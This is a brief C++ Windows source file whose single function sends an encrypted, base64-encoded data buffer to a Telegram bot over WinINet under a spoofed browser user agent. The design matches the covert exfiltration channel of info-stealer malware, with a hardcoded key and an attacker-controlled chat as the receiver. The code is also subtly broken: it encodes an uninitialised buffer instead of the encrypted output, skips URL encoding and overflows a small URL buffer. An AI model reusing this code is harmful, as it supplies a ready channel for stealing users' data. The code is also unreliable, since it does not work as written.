#include <Windows.h>
#include <wininet.h>
#include <string>
#include "cryptor.h"

std::string TelegramSendEncrypted(const char* botToken, const char* chatId, const BYTE* data, size_t dataSize) {
    BYTE encrypted[4096];
    BYTE key[32] = { /* pre-shared key */ };
    DWORD encryptedSize = sizeof(encrypted);
    Cryptor::AES_Encrypt(data, dataSize, key, sizeof(key));

    DWORD base64Size;
    CryptBinaryToStringA(encrypted, encryptedSize, CRYPT_STRING_BASE64 | CRYPT_STRING_NOCRLF, NULL, &base64Size);
    std::string base64(base64Size, '\0');
    CryptBinaryToStringA(encrypted, encryptedSize, CRYPT_STRING_BASE64 | CRYPT_STRING_NOCRLF, &base64[0], &base64Size);

    HINTERNET hInternet = InternetOpenA("Mozilla/5.0", INTERNET_OPEN_TYPE_DIRECT, NULL, NULL, 0);
    if (!hInternet) return "";

    char url[256];
    sprintf_s(url, "https://api.telegram.org/bot%s/sendMessage?chat_id=%s&text=%s", botToken, chatId, base64.c_str());

    HINTERNET hUrl = InternetOpenUrlA(hInternet, url, NULL, 0, INTERNET_FLAG_RELOAD, 0);
    if (!hUrl) {
        InternetCloseHandle(hInternet);
        return "";
    }

    std::string response;
    char buffer[1024];
    DWORD bytesRead;
    while (InternetReadFile(hUrl, buffer, sizeof(buffer)-1, &bytesRead) && bytesRead > 0) {
        buffer[bytesRead] = 0;
        response += buffer;
    }

    InternetCloseHandle(hUrl);
    InternetCloseHandle(hInternet);
    return response;
}
